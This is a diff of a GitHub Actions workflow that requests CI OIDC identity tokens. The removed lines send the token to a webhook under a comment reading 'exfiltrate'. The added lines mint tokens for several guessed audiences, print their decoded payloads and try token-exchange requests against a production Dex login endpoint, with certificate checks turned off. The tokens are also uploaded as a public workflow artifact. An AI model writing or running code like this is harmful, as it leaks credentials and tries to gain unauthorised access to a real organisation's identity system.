@@ -7,6 +7,7 @@ on:
 permissions:
   id-token: write
   contents: read
+  actions: write
 
 jobs:
   get-token:
@@ -14,35 +15,79 @@ jobs:
     steps:
       - name: Get OIDC Token
         run: |
-          # Request an OIDC JWT token from GitHub
-          ID_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://NorthDexTokenExchange")
-          echo "OIDC_TOKEN_RESPONSE=$ID_TOKEN"
-          echo "$ID_TOKEN" > /tmp/oidc_token.json
+          echo "=== Getting OIDC Token ==="
           
-          # Also try with default audience
-          ID_TOKEN2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+          # Get the default OIDC token (no audience)
+          echo "Requesting token..."
+          RESPONSE=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL")
-          echo "DEFAULT_OIDC=$ID_TOKEN2"
+          TOKEN=$(echo "$RESPONSE" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+          echo "TOKEN_LENGTH=${#TOKEN}"
           
-          # Send the token to a webhook endpoint
-          TOKEN_VALUE=$(echo "$ID_TOKEN" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null || echo "parse_error")
-          echo "TOKEN=$TOKEN_VALUE"
+          # Decode the JWT parts to see what we got
+          echo "=== Token header ==="
+          echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null || echo "base64 fail"
+          echo ""
+          echo "=== Token payload ==="
+          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null || echo "base64 fail"
+          echo ""
           
-          # If we have a webhook URL, exfiltrate
-          if [ -n "$WEBHOOK_URL" ]; then
-            curl -s -X POST "$WEBHOOK_URL" \
-              -H "Content-Type: application/json" \
-              -d "{\"oidc_token\": \"$TOKEN_VALUE\"}"
-          fi
+          # Try the token exchange on multiple endpoints
+          echo "=== Testing exchanges ==="
           
-          # Save to workflow artifacts
-          mkdir -p /tmp/tokens
-          echo "$TOKEN_VALUE" > /tmp/tokens/oidc_token.txt
-          cat /tmp/tokens/oidc_token.txt | head -100
-      
-      - name: Upload Token
+          # Test on production Dex
+          echo "--- Production Dex (north-cli) ---"
+          curl -sk "https://north.cohere.com/dex/token" \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            -d "client_id=north-cli" \
+            -d "subject_token=$TOKEN" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
+            -d "connector_id=login" \
+            -d "scope=openid profile email" \
+            --max-time 10
+          echo ""
+          
+          # Test on production Dex without connector
+          echo "--- Production Dex (no connector) ---"
+          curl -sk "https://north.cohere.com/dex/token" \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            -d "client_id=north-cli" \
+            -d "subject_token=$TOKEN" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
+            -d "scope=openid profile email" \
+            --max-time 10
+          echo ""
+          
+          # Test with different audiences
+          echo "=== Testing with specific audience ==="
+          for AUDIENCE in "https://north.cohere.com" "north" "api://NorthDexTokenExchange" "cohere-ai" "cohere.okta.com"; do
+            echo "--- Audience: $AUDIENCE ---"
+            RESPONSE2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUDIENCE")
+            TOKEN2=$(echo "$RESPONSE2" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
+            
+            echo "Token payload:"
+            echo "$TOKEN2" | cut -d. -f2 | base64 -d 2>/dev/null
+            echo ""
+            
+            # Exchange it
+            curl -sk "https://north.cohere.com/dex/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              -d "client_id=north-cli" \
+              -d "subject_token=$TOKEN2" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
+              -d "connector_id=login" \
+              -d "scope=openid profile email" \
+              --max-time 10
+            echo ""
+          done
+          
+          # Save all tokens for debugging
+          echo "$TOKEN" > /tmp/oidc_token_default.txt
+          echo "Token saved"
+          
+      - name: Upload tokens
         uses: actions/upload-artifact@v4
         with:
           name: oidc-tokens
-          path: /tmp/tokens/
+          path: /tmp/oidc_*.txt
